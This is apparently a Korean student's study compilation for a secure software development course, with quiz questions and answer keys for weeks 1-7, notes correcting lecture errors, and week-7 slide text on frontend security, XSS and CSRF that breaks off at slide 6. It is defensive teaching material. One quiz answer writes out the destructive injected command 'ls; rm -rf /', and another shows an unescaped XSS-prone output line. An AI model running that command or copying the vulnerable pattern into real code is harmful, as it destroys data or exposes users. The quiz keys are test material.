- [1-QUESTIONS] 1주차 3차시 퀴즈 3 — 다음 중 CVE와 CWE에 대해서 잘못 이야기한 것은? → 정답 3) CWE Top 25는 보안 취약점 중 가장 위험한 25가지를 선정한
- [1-QUESTIONS] 2주차 1차시 퀴즈 1 — 다음 중 SW개발보안 방법론의 주요 개념이 아닌 것은? → 정답 3) SBOM 다중화
- [1-QUESTIONS] 2주차 1차시 퀴즈 2 — 다음 중 SW 결함 수정비용이 가장 많이 필요한 경우는? → 정답 2) 설계과정 발생한 결함이 제품 출시 단계에서 발견된 경우
- [1-QUESTIONS] 2주차 1차시 퀴즈 3 — 다음 중 MS-SDL 보안개발 방법론에 대한 설명 중 틀린 것은? → 정답 2) 요구사항 정의 단계에 위협 모델링을 수행한다.
- [1-QUESTIONS] 2주차 2차시 퀴즈 1 — 다음 중 위협모델링의 핵심 목표가 아닌 것은? → 정답 4) SW 구조 이해
- [1-QUESTIONS] 2주차 2차시 퀴즈 2 — 다음 중 위협모델링 프로세스 단계에 대한 내용이 틀린 것은? → 정답 1) 시스템 정의
- [1-QUESTIONS] 2주차 2차시 퀴즈 3 — 다음 중 STRIDE 프레임워크에서 정의한 주요 위협요소에 대한 설명으로 올바른 것은? → 정답 3) 서비스 거부
- [1-QUESTIONS] 2주차 3차시 퀴즈 1 — 다음 중 위협모델링 도구 선정 기준으로 가장 적합하지 않은 것은? → 정답 4) CWE/CVE 연계 분석 여부
- [1-QUESTIONS] 2주차 3차시 퀴즈 2 — 다음 중 데이터 흐름 다이어그램(DFD)의 주요 구성요소가 아닌 것은? → 정답 4) Module
- [1-QUESTIONS] 2주차 3차시 퀴즈 3 — 다음 중 데이터 흐름 다이어그램(DFD)를 작성하는 단계는? → 정답 1) 시스템 이해 및 범위 정의
- [1-QUESTIONS] 3주차 1차시 퀴즈 1 — 다음 중 웹 애플리케이션 서버 로직의 3대 계층에 속하지 않는 것은? → 정답 2) 네트워크 계층
- [1-QUESTIONS] 3주차 1차시 퀴즈 2 — 다음 중 HTTP에 대한 설명으로 옳은 것은? → 정답 1) 무상태 방식
- [1-QUESTIONS] 3주차 1차시 퀴즈 3 — 다음 중 BASE64 인코딩에 대한 내용으로 틀린 것은? → 정답 4) 데이터를 8비트 단위로 분할하며, 총 64개의 문자 집합으로 표현
- [1-QUESTIONS] 3주차 2차시 퀴즈 1 — 다음 중 프레임워크와 플랫폼에 대한 설명 중 옳은 것은? → 정답 3) 프레임워크는 특정한 개발방식(패턴)을 강제한다.
- [1-QUESTIONS] 3주차 2차시 퀴즈 2 — 다음 중 프레임워크별 지원 언어에 대한 설명이 잘못된 것은? → 정답 4) Ruby on Rails
- [1-QUESTIONS] 3주차 2차시 퀴즈 3 — 다음 중 Spring Framework와 비교하여 Spring Boot의 장점이 아닌 것은? → 정답 2) WAR 패키징
- [1-QUESTIONS] 3주차 3차시 퀴즈 1 — 다음 중, Spring Boot 개발 방법론에서 계층별 설명이 잘못된 것은? → 정답 4) Service
- [1-QUESTIONS] 3주차 3차시 퀴즈 2 — 게시판 만들기 실습에서 사용한 테스트용 In-Memory DB의 이름은? (2글자) ( ) → 정답 ( H2 )
- [1-QUESTIONS] 3주차 3차시 퀴즈 3 — 다음 중, 게시판 만들기 실습 내용에 대한 설명 중 잘못된 것은? → 정답 1) PUT /posts
- [1-QUESTIONS] 4주차 1차시 퀴즈 1 — 정규식에서 `^` (Caret) 기호의 의미로 알맞은 것은? → 정답 2) 문자열의 시작을 의미
- [1-QUESTIONS] 4주차 1차시 퀴즈 2 — 다음 중 정규식 `a?b`가 매칭할 수 있는 문자열은 무엇일까요? (2개) → 정답 1) b, 2) ab
- [1-QUESTIONS] 4주차 1차시 퀴즈 3 — 정규식을 사용할 때, 특정 문자가 한 번 이상 반복될 경우 사용할 수 있는 기호는 무엇일까요?　(　　) → 정답 ( + ) — `+`는 앞에 나온 문자가 한 번 이상 반복될 경우 매칭할
- [1-QUESTIONS] 4주차 2차시 퀴즈 1 — 다음 리눅스 명령어 중 정규식을 활용할 수 없는 것은? → 정답 3) ps
- [1-QUESTIONS] 4주차 2차시 퀴즈 2 — 자바 프로그램에서 정규식을 받아들여 패턴을 정의하는데 사용하는 클래스명은?　(　　) → 정답 ( Pattern )
- [1-QUESTIONS] 4주차 2차시 퀴즈 3 — 다음 중 정규식 사용시 발생 가능한 문제점이 아닌것은? → 정답 1) DDoS 보안 문제
- [1-QUESTIONS] 4주차 3차시 퀴즈 1 — 클라이언트의 HTTP 요청과 응답을 가로채어 특정 작업을 수행하는 서블릿 기반 컴포넌트는 무엇인가? → 정답 3) Filter
- [1-QUESTIONS] 4주차 3차시 퀴즈 2 — String 클래스에서 정규식으로 지정한 문자열을 다른 문자열로 바꾸기 위해 사용하는 메서드 이름은? (영문 10글자, . 제외)　(　　) → 정답 ( replaceAll )
- [1-QUESTIONS] 4주차 3차시 퀴즈 3 — 다음 중 XSS 입력값 필터에서 처리해야 하는 내용이 아닌 것은? → 정답 4) 압축파일 안에 들어있는 스크립트 파일 제거
- [1-QUESTIONS] 5주차 1차시 퀴즈 1 — 다음 중 인증과 인가에 대한 설명 중 잘못된 것은? → 정답 1) 인증은 사용자에게 리소스 접근 가능한 권한을 부여하는 것
- [1-QUESTIONS] 5주차 1차시 퀴즈 2 — 사용자의 역할에 따라 접근 권한을 부여하는 방식을 나타내는 용어는? (영문 4글자) ( ) → 정답 ( RBAC )
- [1-QUESTIONS] 5주차 1차시 퀴즈 3 — 다음중 인가 보안 위협에 대한 대응 방안은? → 정답 1) 최소권한원칙
- [1-QUESTIONS] 5주차 2차시 퀴즈 1 — 다음 중 OAuth2에 대한 설명으로 맞지 않는 것은? → 정답 4) 비밀번호를 통해 접근 권한을 위임
- [1-QUESTIONS] 5주차 2차시 퀴즈 2 — OAuth2의 구성 요소에 대한 설명 중 잘못된 것은? → 정답 1) Resource Owner
- [1-QUESTIONS] 5주차 2차시 퀴즈 3 — Access Token 재발급을 위한 장기 인증 수단으로, 사용자 재로그인 없이 새로운 Access Token을 발급하기 위해 사용하는 Token의 이름은 무… → 정답 ( refresh )
- [1-QUESTIONS] 5주차 3차시 퀴즈 1 — JWT의 주요 특징에 해당하지 않는 것은? → 정답 4) 헤더-페이로드-트레일러 로 구성
- [1-QUESTIONS] 5주차 3차시 퀴즈 2 — JWT의 단점 중 틀린 것은? → 정답 1) 만료 시간 전 강제 무효화를 위한 관리자 페이지 필요
- [1-QUESTIONS] 5주차 3차시 퀴즈 3 — JWT 페이로드에 포함시키는 사용자 식별자, 역할, 권한 등의 정보를 일컫는 단어는? ( ) → 정답 ( 클레임 또는 claim )
- [1-QUESTIONS] 6주차 1차시 퀴즈 1 — 다음 중 ORM(Object-Relational Mapping)의 주요 장점이 아닌 것은? → 정답 3) 모든 SQL 최적화를 자동으로 수행하여 성능 문제 없음
- [1-QUESTIONS] 6주차 1차시 퀴즈 2 — MyBatis 프레임워크의 특징으로 적절한 것은? → 정답 2) SQL을 직접 작성하면서도 매핑 작업을 줄여 생산성을 높임
- [1-QUESTIONS] 6주차 1차시 퀴즈 3 — ORM을 잘못 사용할 경우 발생할 수 있는 대표적인 보안 취약점 중 하나로, SQL 쿼리를 문자열 결합 방식으로 생성할 때 발생할 수 있는 공격 기법은 무엇인… → 정답 ( SQL Injection 또는 SQL 인젝션 )
- [1-QUESTIONS] 6주차 2차시 퀴즈 1 — 다음 중 SQL 인젝션을 예방하기 위한 방법으로 옳지 않은 것은 무엇일까요? → 정답 3) 개발자가 만든 쿼리를 문자열 결합으로 직접 작성한다.
- [1-QUESTIONS] 6주차 2차시 퀴즈 2 — 다음 중 SQL 인젝션 공격으로 인해 발생할 수 있는 피해가 아닌 것은 무엇일까요? → 정답 4) 네트워크 장비가 물리적으로 파손된다.
- [1-QUESTIONS] 6주차 2차시 퀴즈 3 — SQL 인젝션 방어를 위해 Java에서 동적 SQL 대신 권장되는 JDBC API 클래스 이름은? ( ) → 정답 ( PreparedStatement )
- [1-QUESTIONS] 6주차 3차시 퀴즈 1 — 다음 중 Windows 환경에서 Command 인젝션 위험을 줄이기 위한 방법으로 가장 옳은 것은 ? → 정답 3) 명령 인자를 배열로 분리하고, 권한이 제한된 계정으로 실행한다.
- [1-QUESTIONS] 6주차 3차시 퀴즈 2 — 다음 중 Command 인젝션 공격 예시로 볼 수 있는 것은 ? → 정답 3) ls; rm -rf /
- [1-QUESTIONS] 6주차 3차시 퀴즈 3 — Linux 환경에서 명령어를 연속 실행하기 위해 자주 사용되는 쉘 연산자 기호를 정확히 쓰세요. ( ) → 정답 ( ; )
- [1-QUESTIONS] 7주차 1차시 퀴즈 1 — 다음 중 로컬 저장소(LocalStorage)에 민감 정보를 저장했을 때 발생할 수 있는 문제가 아닌 것은 ? → 정답 3) 도메인이 다르면 로컬 저장소를 공유할 수 있다.
- [1-QUESTIONS] 7주차 1차시 퀴즈 2 — SSR(Server-Side Rendering)과 CSR(Client-Side Rendering)에 대한 설명으로 옳은 것은 ? → 정답 3) SSR은 서버에서 HTML을 완성해 응답하고, CSR은 클라이언트가
- [1-QUESTIONS] 7주차 1차시 퀴즈 3 — 프론트엔드에서 외부 스크립트나 스타일의 로딩 출처를 제한해 XSS 같은 공격을 완화하기 위해 사용하는 보안 정책은 ? (영문 3글자) ( ) → 정답 ( CSP )
- [1-QUESTIONS] 7주차 2차시 퀴즈 1 — 다음 중 XSS 방어 기법에 해당하지 않는 것은 ? → 정답 4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증
- [1-QUESTIONS] 7주차 2차시 퀴즈 2 — 다음 중 XSS를 유발할 수 있는 취약한 코드 예시로 옳은 것은 ? → 정답 1) out.println("You searched for: " + re
- [1-QUESTIONS] 7주차 2차시 퀴즈 3 — XSS의 종류 중 서버를 거치지 않고, 클라이언트 자바스크립트 로직에서 발생하는 공격 방식은? (영어 대문자 3글자) ( ) → 정답 ( DOM )
- [1-QUESTIONS] 7주차 3차시 퀴즈 1 — 다음 중 CSRF 공격이 성공하기 위해 반드시 필요한 조건은 ? → 정답 1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.
- [1-QUESTIONS] 7주차 3차시 퀴즈 2 — 다음 중 CSRF 방어 기법에 해당하지 않는 것은 ? → 정답 4) 암호화된 비밀번호로 로그인 처리
- [1-QUESTIONS] 7주차 3차시 퀴즈 3 — CSRF 공격을 완화하기 위해 쿠키에 설정하는 속성 중, 외부 도메인에서 요청이 발생했을 때 쿠키가 자동 전송되지 않도록 제한하기 위해 사용하는 속성은 ? ( ) → 정답 ( SameSite )

---

# [1-QUESTIONS] 7주차 1차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · PreparedStatement/프리페어드 스테이트먼트/파라미터 바인딩/바인딩/setString · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · DOM XSS/DOM 기반 XSS/돔 기반/document.write/innerHTML · Command Injection/커맨드 인젝션/명령어 삽입/명령 삽입/OS Command/CWE-78 · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · SameSite/세임사이트/Strict/Lax/None · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · 화이트리스트/Whitelist/최소 허용/허용 목록 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · IDOR/Insecure Direct Object References/직접 객체 참조/수평 권한/수직 권한/권한 상승 · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링 · localStorage/sessionStorage/로컬 저장소/로컬 스토리지/Same-Origin · CORS/코어스/Cross-Origin/교차 출처 · ZAP/OWASP ZAP/Active Scan/Burp/버프스위트/버프 스위트 · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

## [1-QUESTIONS] 7주차 1차시 p.28 · 퀴즈 1
문제: 다음 중 로컬 저장소(LocalStorage)에 민감 정보를 저장했을 때 발생할 수 있는 문제가 아닌 것은 ?
1) XSS 공격이 성공하면 로컬 저장소 내용이 유출될 수 있다.
2) 로컬 저장소는 기본적으로 평문으로 저장된다.
3) 도메인이 다르면 로컬 저장소를 공유할 수 있다.
4) 악성 스크립트가 로컬 저장소 내용을 임의로 변경할 수 있다.
정답: 3) 도메인이 다르면 로컬 저장소를 공유할 수 있다.
해설: Same-Origin Policy로 인해, 도메인이 다르면 로컬 저장소를 공유할 수 없습니다.
출처: [2-SLIDES] 7주차 1차시 p.28 (문제) · p.29 (정답)

## [1-QUESTIONS] 7주차 1차시 p.28 · 퀴즈 2
문제: SSR(Server-Side Rendering)과 CSR(Client-Side Rendering)에 대한 설명으로 옳은 것은 ?
1) SSR은 브라우저가 기본 HTML만 받고, 모든 UI를 JavaScript로 구성한다.
2) CSR은 서버에서 데이터를 주입해 완성된 HTML을 전송한다.
3) SSR은 서버에서 HTML을 완성해 응답하고, CSR은 클라이언트가 JS로 화면을 동적으로 구성한다.
4) CSR은 검색 엔진 최적화(SEO)에 매우 유리하며, SSR은 초기 로딩이 느리다.
정답: 3) SSR은 서버에서 HTML을 완성해 응답하고, CSR은 클라이언트가 JS로 화면을 동적으로 구성한다.
해설: SSR은 서버가 완성된 HTML을, CSR은 브라우저가 JS로 동적 화면을 구성하는 방식입니다.
출처: [2-SLIDES] 7주차 1차시 p.28 (문제) · p.29 (정답)

## [1-QUESTIONS] 7주차 1차시 p.28 · 퀴즈 3
문제: 프론트엔드에서 외부 스크립트나 스타일의 로딩 출처를 제한해 XSS 같은 공격을 완화하기 위해 사용하는 보안 정책은 ? (영문 3글자) ( )
정답: ( CSP )
출처: [2-SLIDES] 7주차 1차시 p.28 (문제) · p.29 (정답)

## [1-QUESTIONS] 7주차 1차시 p.28 · 비고
정답 보기(`3) 도메인이 다르면…`, `3) SSR은 서버에서…`)와 3번 정답 `CSP`는 슬라이드에서 빨간 글씨로 표시됨.
(※ 검증: 1번 해설의 '도메인'은 정확히는 출처(origin = 스킴+호스트+포트) 단위 — localStorage는 출처별로 분리되므로 같은 도메인이라도 http/https나 포트가 다르면 공유되지 않음. 정답 자체는 맞음)

# [1-QUESTIONS] 7주차 2차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · PreparedStatement/프리페어드 스테이트먼트/파라미터 바인딩/바인딩/setString · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · Reflected XSS/반사형 XSS/리플렉티드 · Stored XSS/저장형 XSS/스토어드 · DOM XSS/DOM 기반 XSS/돔 기반/document.write/innerHTML · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · SameSite/세임사이트/Strict/Lax/None · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링

## [1-QUESTIONS] 7주차 2차시 p.32 · 퀴즈 1
문제: 다음 중 XSS 방어 기법에 해당하지 않는 것은 ?
1) HTML 엔티티 이스케이프로 <script>를 무해한 텍스트로 변환
2) CSP를 적용해 악성 스크립트 로드를 제한
3) 입력값 필터링으로 < > 같은 특수문자 차단
4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증
정답: 4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증
해설: CSRF 토큰은 주로 CSRF 공격 방어 기법이며, XSS 방어와는 직접 관련이 없습니다.
출처: [2-SLIDES] 7주차 2차시 p.32 (문제) · p.33 (정답)

## [1-QUESTIONS] 7주차 2차시 p.32 · 퀴즈 2
문제: 다음 중 XSS를 유발할 수 있는 취약한 코드 예시로 옳은 것은 ?
1) `out.println("You searched for: " + request.getParameter("q"));`
2) `response.setHeader("Content-Security-Policy", "default-src 'self'");`
3) `<input type="hidden" name="_csrf" value="...">`
4) `textContent = escapeHtml(userInput);`
정답: 1) out.println("You searched for: " + request.getParameter("q"));
해설: 사용자 입력값을 검증 없이 그대로 출력하면 XSS 공격이 발생할 수 있습니다.
출처: [2-SLIDES] 7주차 2차시 p.32 (문제) · p.33 (정답)

## [1-QUESTIONS] 7주차 2차시 p.32 · 퀴즈 3
문제: XSS의 종류 중 서버를 거치지 않고, 클라이언트 자바스크립트 로직에서 발생하는 공격 방식은? (영어 대문자 3글자) ( )
정답: ( DOM )
출처: [2-SLIDES] 7주차 2차시 p.32 (문제) · p.33 (정답)

## [1-QUESTIONS] 7주차 2차시 p.32 · 비고
(정답 표시: 1번의 "4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증", 2번의 "1) out.println(...)" 코드, 3번의 "DOM"이 빨간 글씨로 강조됨)

# [1-QUESTIONS] 7주차 3차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · Stored XSS/저장형 XSS/스토어드 · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · SameSite/세임사이트/Strict/Lax/None · 화이트리스트/Whitelist/최소 허용/허용 목록 · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링

## [1-QUESTIONS] 7주차 3차시 p.26 · 퀴즈 1
문제: 다음 중 CSRF 공격이 성공하기 위해 반드시 필요한 조건은 ?
1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.
2) 서버가 Referer 검증을 엄격하게 적용해야 한다.
3) CSRF 토큰을 매 요청마다 발급해야 한다.
4) 브라우저가 SameSite=Strict로 쿠키를 설정해 둬야 한다.
정답: 1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.
해설: 공격이 성립하려면, 사용자가 로그인 중이라 브라우저가 쿠키를 전송해야 합니다.
출처: [2-SLIDES] 7주차 3차시 p.26 (문제) · p.27 (정답)

## [1-QUESTIONS] 7주차 3차시 p.26 · 퀴즈 2
문제: 다음 중 CSRF 방어 기법에 해당하지 않는 것은 ?
1) CSRF 토큰을 사용해 요청 시 고유 값 검증
2) SameSite 쿠키로 외부 도메인에서 쿠키 자동 전송 제한
3) Referer/Origin 검사로 출처가 올바른지 확인
4) 암호화된 비밀번호로 로그인 처리
정답: 4) 암호화된 비밀번호로 로그인 처리
해설: 비밀번호 암호화는 인증 과정 보안이지만, CSRF 방어 기법과는 직접 관련이 없습니다.
출처: [2-SLIDES] 7주차 3차시 p.26 (문제) · p.27 (정답)

## [1-QUESTIONS] 7주차 3차시 p.26 · 퀴즈 3
문제: CSRF 공격을 완화하기 위해 쿠키에 설정하는 속성 중, 외부 도메인에서 요청이 발생했을 때 쿠키가 자동 전송되지 않도록 제한하기 위해 사용하는 속성은 ? ( )
정답: ( SameSite )
출처: [2-SLIDES] 7주차 3차시 p.26 (문제) · p.27 (정답)

## [1-QUESTIONS] 7주차 3차시 p.26 · 비고
(정답 표시: 1번 "1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.", 2번 "4) 암호화된 비밀번호로 로그인 처리", 3번 괄호 안 "SameSite"가 빨간 글씨로 표시됨. ※ 검증: 26쪽 보기와 대조 — 1번의 2)·3)·4)는 모두 방어 측 조치라 공격 성립 조건이 아니고, 2번의 1)~3)은 18~22쪽에서 다룬 방어 기법(토큰·SameSite·Origin/Referer)이므로 정답 1 / 4 / SameSite — 일치)

---

# [4-NOTES] 7주차 관련 정리 (신뢰도 C~D) — 교안·발화가 다른 지점. 시험 답은 교안 우선.

## [4-NOTES] 7주차 1차시 · localStorage 서브도메인 공유 — 오류 (C)
키워드: localStorage, 로컬 저장소, Same-Origin, 서브도메인, 출처
- [7주차 1차시 15:21]: "서브 도메인이나 같은 도메인의 다른 경로에서도 로컬 저장소를 공유할 수 있다"고 함.
- 바로잡음: localStorage는 **출처(origin: 스킴+호스트+포트) 단위**로 분리됨. 서브도메인은 다른 호스트라 공유 안 됨. 같은 출처의 다른 경로는 공유되는 게 맞음. [2-SLIDES] 7주차 1차시 p.29 퀴즈 해설도 같은 취지.

## [4-NOTES] 7주차 2차시 · innerHTML로 넣은 script 태그 실행 여부 (C)
키워드: XSS, innerHTML, script 태그, textContent
- [2-SLIDES] 7주차 2차시 p.24 · [7주차 2차시 33:38]: 사용자 입력을 innerHTML에 넣으면 script 태그가 실행된다고 설명.
- 바로잡음: 표준(HTML5)상 innerHTML로 삽입한 script 태그는 실행되지 않음. 실제 공격은 이벤트 핸들러 속성(이미지 로드 실패 등)으로 이뤄짐. 다만 "innerHTML은 XSS에 취약하다"는 결론과 "textContent를 써라"는 대응은 맞음.

## [4-NOTES] 7주차 2차시 · DOM XSS 실습의 핵심 (C)
키워드: DOM XSS, 서버 이스케이프, unescape, document.write, 디코딩
- 실습 흐름: 서버가 꺾쇠를 HTML 인코딩해서 넘겨도, 클라이언트 스크립트가 받은 값을 다시 디코딩(unescape)한 뒤 document.write로 출력함.
- 핵심: **서버의 이스케이프가 클라이언트의 재디코딩으로 무력화**됨. DOM 조작 전에 클라이언트에서도 정제해야 하고, document.write 대신 안전한 출력을 써야 함. ([2-SLIDES] 7주차 2차시 p.17 · 2차시 실습과 일치)

## [4-NOTES] 7주차 2차시 · 교안 코드 writeln — 표기 오류 (C)
키워드: XSS, Reflected, writeln, println, JSP
- [2-SLIDES] 7주차 2차시 p.11·p.14 코드에 out.writeln(...)으로 적혀 있으나 Java 출력 메서드는 println. [2-SLIDES] 7주차 2차시 p.32 퀴즈에서는 println으로 표기. 축약·오타.

## [4-NOTES] 공통 · 자동 전사 한계 (C)
키워드: 녹취, 자동 전사, 불명확, 음성 인식
- 3-TRANSCRIPT는 자동 전사라 영문 용어·숫자·포트·메서드명에 오인식이 있을 수 있음([불명확]·[표현 차이] 표시). 숫자·코드·정확한 용어는 2-SLIDES(교안)를 우선.
- 6·7주차 녹취는 화면 기록이 없어 교수님 펜 강조 위치를 알 수 없음. 7주차는 1차시 앞부분(시험 안내)과 3차시 중간에 무음 구간이 있어 누락 가능.

## [4-NOTES] 시험 안내 (B, 발화 근거)
키워드: 중간고사, 시험, LMS, 온라인, 범위
- [7주차 1차시 00:00] 발화: 8주차에 중간고사, LMS 온라인 실시간, 공지사항 확인 요망. 범위는 "오늘까지 수업 내용"(1~7주차).
- 시험 규정(사용자 확인): 2026-10-22(목) 19:00~20:00, 온라인 LMS 퀴즈, AI·오픈북 가능, 범위 1~7주차. 날짜·시간은 LMS 공지로 최종 확인.

---

# [2-SLIDES] 7주차 1차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · PreparedStatement/프리페어드 스테이트먼트/파라미터 바인딩/바인딩/setString · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · DOM XSS/DOM 기반 XSS/돔 기반/document.write/innerHTML · Command Injection/커맨드 인젝션/명령어 삽입/명령 삽입/OS Command/CWE-78 · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · SameSite/세임사이트/Strict/Lax/None · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · 화이트리스트/Whitelist/최소 허용/허용 목록 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · IDOR/Insecure Direct Object References/직접 객체 참조/수평 권한/수직 권한/권한 상승 · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링 · localStorage/sessionStorage/로컬 저장소/로컬 스토리지/Same-Origin · CORS/코어스/Cross-Origin/교차 출처 · ZAP/OWASP ZAP/Active Scan/Burp/버프스위트/버프 스위트 · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

## [2-SLIDES] 7주차 1차시 p.1 · 프론트엔드 데이터 처리
프론트엔드 데이터 처리
01 프론트엔드 데이터 처리 개념
02 프론트엔드 보안 이슈
03 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.2 · 학습 목표
학습 목표
웹 애플리케이션에서 프론트엔드 데이터 처리가 보안에 미치는 영향을 이해한다.
클라이언트 측(JavaScript)에서 발생할 수 있는 보안 취약점을 학습한다.
보안 강화를 위한 프론트엔드 개발 및 데이터 처리 방법을 익힌다.

---

## [2-SLIDES] 7주차 1차시 p.3 · 학습 내용
학습 내용
1. 프론트엔드 데이터 처리 개념
2. 프론트엔드 보안 이슈
3. 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.4 · 프론트엔드 데이터 처리
프론트엔드 데이터 처리
01 프론트엔드 데이터 처리 개념
02 프론트엔드 보안 이슈
03 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.5 · 클라이언트/서버 구조
클라이언트/서버 구조
정의 및 기본 개념
- 클라이언트: 사용자 인터페이스(UI)를 제공하며, 사용자의 요청(예: 브라우저, 모바일 앱)이 발생하는 프론트엔드 부분
- 서버: 클라이언트의 요청을 처리하고, 필요한 데이터를 생성하거나 제공하는 백엔드 시스템
통신 방식: 웹 환경에서 클라이언트와 서버는 주로 HTTP/HTTPS 프로토콜을 통해 네트워크 상에서 데이터를 주고받음
구조적 특징
- 분리된 역할: 클라이언트는 사용자 경험에 집중, 서버는 데이터 처리와 비즈니스 로직 수행
- 중앙 집중식 처리: 서버가 모든 요청을 받아 처리하고, 클라이언트는 결과를 화면에 표시
- 확장성: 서버를 확장하여 여러 클라이언트의 요청을 처리할 수 있음
통신 흐름에 따른 처리 형태
① 클라이언트 : [요청 전송] 사용자가 서버로 웹 페이지를 요청하거나 데이터를 입력
② 서버 : [요청 처리] 서버가 요청을 받아 비즈니스 로직 실행, 데이터베이스 연동 등 수행
③ 서버 : [응답 전송] 처리 결과를 클라이언트에 반환, 웹 페이지 렌더링 또는 API 응답 제공

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[도식: 클라이언트/서버 통신]** (슬라이드 오른쪽 하단 그림)
- 왼쪽: 데스크톱 PC 아이콘 — 라벨 `Client`
- 오른쪽: 서버 랙 아이콘 — 라벨 `Server`
- 위쪽 화살표 Client → Server: `Request`
- 아래쪽 화살표 Server → Client: `Response`
→ ① 클라이언트가 요청(Request) 전송 → ② 서버가 처리 → ③ 서버가 응답(Response) 반환하는 흐름을 나타냄.

---

## [2-SLIDES] 7주차 1차시 p.6 · 프론트엔드의 역할
프론트엔드의 역할
프론트엔드 정의
사용자와 직접 상호작용하는 웹 애플리케이션의 "보이는 부분"
브라우저에서 실행되며, HTML, CSS, JavaScript 등을 활용
주요 역할
- UI/UX 제공
사용자 친화적인 인터페이스 설계 및 반응형 디자인 구현
사용자 경험(UX) 개선 및 접근성 고려
- 데이터 시각화 및 인터랙션
사용자 입력 처리, 애니메이션 및 동적 콘텐츠 제공
클라이언트-서버 간 데이터 교환 및 API 호출 처리
- 표출 성능 최적화
페이지 로딩 속도 향상, 리소스 압축 및 캐싱 전략 적용
출처: https://medium.com/@adityagaba1322/streamlining-backend-frontend-integration-a-quick-guide-145eca3cca05

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[도식: FRONT-END / BACK-END 구성]** (슬라이드 오른쪽 그림, 출처 medium.com)
- 왼쪽 파란 영역 **FRONT-END**
